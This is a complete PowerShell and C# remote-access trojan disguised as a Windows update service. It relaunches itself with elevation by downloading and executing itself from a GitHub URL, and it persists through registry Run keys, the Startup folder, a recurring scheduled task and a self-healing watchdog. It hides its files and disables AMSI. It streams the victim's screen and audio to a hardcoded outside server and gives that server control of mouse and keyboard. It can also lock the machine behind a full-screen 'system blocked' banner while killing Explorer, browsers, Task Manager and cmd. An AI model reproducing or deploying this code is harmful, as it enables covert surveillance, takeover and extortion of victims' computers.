# language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
# full agent — install, persistence, AMSI bypass, mutex guard, C# runtime with reconnect fix

$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

$dir = "$env:ProgramData\Microsoft\Windows\Caches"
$scriptPath = "$dir\$installName.ps1"
$vbsPath = "$dir\$installName.vbs"

if ($args -notcontains "-silent") {
    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}

    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue

    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""

    try {
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $startup = [Environment]::GetFolderPath('Startup')
        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
        $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
        $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) `
            -RepetitionInterval (New-TimeSpan -Minutes 3) `
            -RepetitionDuration ([TimeSpan]::FromDays(3650))
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" `
            -Action $action -Trigger $triggerLogon,$triggerRepeat -Principal $principal `
            -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    attrib +h +s +r $scriptPath 2>$null
    attrib +h +s +r $vbsPath 2>$null

    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    exit
}

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

# single-instance guard — scheduled task fires every 3 min, this exits in 20ms if agent already alive.
# kernel releases the mutex when the process dies, so the next task fire restarts cleanly.
$mutex = New-Object System.Threading.Mutex($false, "Local\WinUpdateSvcMutex")
if (-not $mutex.WaitOne(0)) { exit }

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;
    using System.Net;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();

        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceEnumerator {
            int NotImpl1();
            int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
        }
        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDevice {
            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
        }
        [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioClient {
            int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
            int GetBufferSize(out uint pNumBufferFrames);
            int GetStreamLatency(out long phnsLatency);
            int GetCurrentPadding(out uint pNumPaddingFrames);
            int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
            int GetMixFormat(out IntPtr ppDeviceFormat);
            int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
            int Start();
            int Stop();
            int Reset();
            int SetEventHandle(IntPtr eventHandle);
            int GetService(ref Guid riid, out IAudioCaptureClient ppv);
        }
        [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioCaptureClient {
            int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
            int ReleaseBuffer(uint NumFramesRead);
            int GetNextPacketSize(out uint pNumFramesInNextPacket);
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag;
            public ushort nChannels;
            public uint nSamplesPerSec;
            public uint nAvgBytesPerSec;
            public ushort nBlockAlign;
            public ushort wBitsPerSample;
            public ushort cbSize;
        }

        static string IP;
        static int PORT;
        static volatile bool streaming = false;
        static volatile bool isAudioRunning = false;
        static object writeLock = new object();
        static object capLock = new object();
        static volatile bool isLocked = false;
        static volatile int targetX = 0;
        static volatile int targetY = 0;
        static volatile bool hasNewPos = false;

        static volatile Form bannerForm = null;
        static volatile Thread bannerThread = null;
        static volatile StreamWriter globalWriter = null;

        static Bitmap reuseBmp = null;
        static Graphics reuseGfx = null;
        static ImageCodecInfo jpgCodec = null;
        static EncoderParameters jpgParams = null;

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            try { SetProcessDPIAware(); } catch {}

            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();

            while (true) {
                TcpClient myClient = null;
                try {
                    myClient = new TcpClient();
                    myClient.NoDelay = true;
                    myClient.SendTimeout = 10000;
                    myClient.ReceiveTimeout = 60000;
                    IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
                    if (!ar.AsyncWaitHandle.WaitOne(5000)) {
                        myClient.Close();
                        throw new Exception("connect timeout");
                    }
                    myClient.EndConnect(ar);

                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;
                    globalWriter = myWriter;

                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                    Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();

                    while (true) {
                        if (myClient.Client == null) break;
                        bool dead = false;
                        try {
                            if (!myClient.Client.Connected) dead = true;
                            else if (myClient.Client.Poll(0, SelectMode.SelectRead) && myClient.Client.Available == 0) dead = true;
                        } catch { dead = true; }
                        if (dead) break;
                        Thread.Sleep(500);
                    }
                } catch {
                } finally {
                    streaming = false;
                    isAudioRunning = false;
                    globalWriter = null;
                    try { if (myClient != null) myClient.Close(); } catch {}
                }
                Thread.Sleep(3000);
            }
        }

        static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
            while (true) {
                try { lock (writeLock) { myWriter.WriteLine("PING"); } }
                catch { break; }
                Thread.Sleep(20000);
            }
        }

        static void WatchdogLoop() {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
            string scriptPath = dir + @"\WinUpdateSvc.ps1";
            string vbsPath = dir + @"\WinUpdateSvc.vbs";

            while (true) {
                try {
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    if (!File.Exists(scriptPath)) {
                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }
                    if (!File.Exists(vbsPath)) {
                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                        File.WriteAllText(vbsPath, vbs);
                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }
                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk != null && rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk != null && rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                    if (!File.Exists(startupVbs)) {
                        try { File.Copy(vbsPath, startupVbs, true); File.SetAttributes(startupVbs, FileAttributes.Hidden | FileAttributes.System); } catch {}
                    }
                } catch {}
                Thread.Sleep(5000);
            }
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (true) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) break;
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            } catch {}
            try { myClient.Close(); } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
                    } else {
                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                    }
                } catch {}
                Thread.Sleep(10);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            while (myClient.Connected) {
                try {
                    if (streaming) {
                        string b64 = CaptureScreen(1280, 40);
                        if (b64 != null) {
                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                            Thread.Sleep(30);
                        } else { Thread.Sleep(100); }
                    } else { Thread.Sleep(50); }
                } catch { Thread.Sleep(1000); }
            }
        }

        static void StartAudio() {
            if (isAudioRunning) return;
            isAudioRunning = true;
            Thread t = new Thread(() => {
                try {
                    IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                    IMMDevice device;
                    enumerator.GetDefaultAudioEndpoint(0, 1, out device);

                    Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                    IAudioClient audioClient;
                    device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);

                    IntPtr pFormat;
                    audioClient.GetMixFormat(out pFormat);
                    WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));

                    int hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
                    if (hr != 0) {
                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Initialize falhou hr=" + hr); }
                        isAudioRunning = false;
                        return;
                    }

                    Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                    IAudioCaptureClient captureClient;
                    audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);

                    audioClient.Start();

                    bool sentFmt = false;
                    while (isAudioRunning && globalWriter != null) {
                        Thread.Sleep(50);
                        uint packetSize;
                        captureClient.GetNextPacketSize(out packetSize);
                        while (packetSize > 0 && isAudioRunning) {
                            IntPtr pData;
                            uint numFrames;
                            uint flags;
                            ulong pos, qpc;
                            captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);

                            if (numFrames > 0) {
                                int bytes = (int)(numFrames * wfx.nBlockAlign);
                                byte[] buffer = new byte[bytes];
                                Marshal.Copy(pData, buffer, 0, bytes);

                                if (wfx.wFormatTag == 3) {
                                    byte[] pcm16 = new byte[bytes / 2];
                                    for (int i = 0; i < bytes / 4; i++) {
                                        float f = BitConverter.ToSingle(buffer, i * 4);
                                        short s = (short)(f * 32767.0f);
                                        pcm16[i * 2] = (byte)(s & 0xFF);
                                        pcm16[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
                                    }
                                    buffer = pcm16;
                                }

                                lock (writeLock) {
                                    if (globalWriter != null) {
                                        if (!sentFmt) {
                                            globalWriter.WriteLine("AUDIO_FMT:" + wfx.nSamplesPerSec + ":" + wfx.nChannels + ":16");
                                            sentFmt = true;
                                        }
                                        globalWriter.WriteLine("AUDIO:" + Convert.ToBase64String(buffer));
                                    }
                                }
                            }
                            captureClient.ReleaseBuffer(numFrames);
                            captureClient.GetNextPacketSize(out packetSize);
                        }
                    }
                    audioClient.Stop();
                } catch (Exception ex) {
                    lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: " + ex.Message); }
                } finally {
                    isAudioRunning = false;
                }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        static void ProcessCommand(string cmd, StreamWriter myWriter) {
            try {
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }

                if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }

                if (cmd == "banner_on") {
                    if (bannerThread != null && bannerThread.IsAlive) return;
                    BlockInput(true);
                    bannerThread = new Thread(() => {
                        try {
                            Image bgImg = null;
                            try {
                                using (var wc = new WebClient()) {
                                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
                                    using (MemoryStream ms = new MemoryStream(imgBytes)) {
                                        bgImg = Image.FromStream(ms);
                                    }
                                }
                            } catch {}

                            Form f = new Form();
                            f.FormBorderStyle = FormBorderStyle.None;
                            f.WindowState = FormWindowState.Maximized;
                            f.TopMost = true;
                            f.ShowInTaskbar = false;
                            f.BackColor = Color.Black;

                            if (bgImg != null) {
                                f.BackgroundImage = bgImg;
                                f.BackgroundImageLayout = ImageLayout.Stretch;
                            } else {
                                f.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                            }

                            f.KeyPreview = true;
                            f.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
                            bannerForm = f;
                            Application.Run(f);
                        } catch {}
                    });
                    bannerThread.SetApartmentState(ApartmentState.STA);
                    bannerThread.IsBackground = true;
                    bannerThread.Start();
                    lock(writeLock) { myWriter.WriteLine("BANNER_ON"); }
                    return;
                }

                if (cmd == "banner_off") {
                    BlockInput(false);
                    Form f = bannerForm;
                    if (f != null) {
                        try { f.BeginInvoke(new Action(() => f.Close())); } catch {}
                        bannerForm = null;
                    }
                    Thread bt = bannerThread;
                    if (bt != null) {
                        try { bt.Join(2000); } catch {}
                        bannerThread = null;
                    }
                    lock(writeLock) { myWriter.WriteLine("BANNER_OFF"); }
                    return;
                }

                if (cmd == "uninstall") {
                    BlockInput(false);
                    UnblockAllApps();
                    try {
                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue("WinUpdateSvc", false); }
                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue("WinUpdateSvc", false); }
                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
                        string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                        if (File.Exists(startupVbs)) { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); }

                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
                    } catch {}
                    Environment.Exit(0);
                }

                if (cmd == "block_apps") { BlockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); } return; }
                if (cmd == "unblock_apps") { UnblockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); } return; }

                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
                if (cmd == "screenshot") { string s = CaptureScreen(1920, 85); if (s != null) { lock(writeLock) { myWriter.WriteLine("SCREEN:" + s); } } return; }
                if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                    hasNewPos = true;
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static void BlockAllApps() {
            try { Process.Start("taskkill", "/F /IM explorer.exe").WaitForExit(); } catch {}
            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave" };
            foreach(var b in browsers) { try { Process.Start("taskkill", "/F /IM " + b + ".exe").WaitForExit(); } catch {} }

            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")) {
                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }

            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try {
                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
                        key.SetValue("Debugger", "svchost.exe");
                    }
                } catch {}
            }
        }

        static void UnblockAllApps() {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) {
                if (key != null) {
                    key.DeleteValue("NoViewOnDrive", false);
                    key.DeleteValue("NoRun", false);
                    key.DeleteValue("NoDesktop", false);
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
                if (key != null) {
                    key.DeleteValue("DisableTaskMgr", false);
                    key.DeleteValue("DisableRegistryTools", false);
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }

            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try { Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false); } catch {}
            }

            try { Process.Start("explorer.exe"); } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            lock (capLock) {
                try {
                    Rectangle bounds = Screen.PrimaryScreen.Bounds;

                    if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
                        if (reuseGfx != null) reuseGfx.Dispose();
                        if (reuseBmp != null) reuseBmp.Dispose();
                        reuseBmp = new Bitmap(bounds.Width, bounds.Height);
                        reuseGfx = Graphics.FromImage(reuseBmp);
                    }

                    reuseGfx.CopyFromScreen(0, 0, 0, 0, bounds.Size);

                    Bitmap finalBmp = reuseBmp;
                    if (maxW > 0 && reuseBmp.Width > maxW) {
                        int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                        }
                    }

                    using (MemoryStream ms = new MemoryStream()) {
                        if (jpgCodec == null) {
                            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                            foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
                            jpgParams = new EncoderParameters(1);
                            jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        }
                        finalBmp.Save(ms, jpgCodec, jpgParams);
                        if (finalBmp != reuseBmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                } catch { return null; }
            }
        }
    }
"@
}

[R9KAgent]::Start($serverIP, $serverPort)
